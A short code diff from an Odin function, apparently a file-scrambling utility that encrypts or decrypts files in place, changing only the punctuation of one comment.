@@ -69,7 +69,7 @@ scramble_file :: proc(info: os.File_Info) {
 		// Write decrypted data
 		os.write_entire_file(info.fullpath, data)
 	} else {
-		// Write encrypted data, after base64 encoding
+		// Write encrypted data after base64 encoding
 		fd, _ := os.open(info.fullpath, os.O_RDWR | os.O_TRUNC)
 		defer os.close(fd)
 
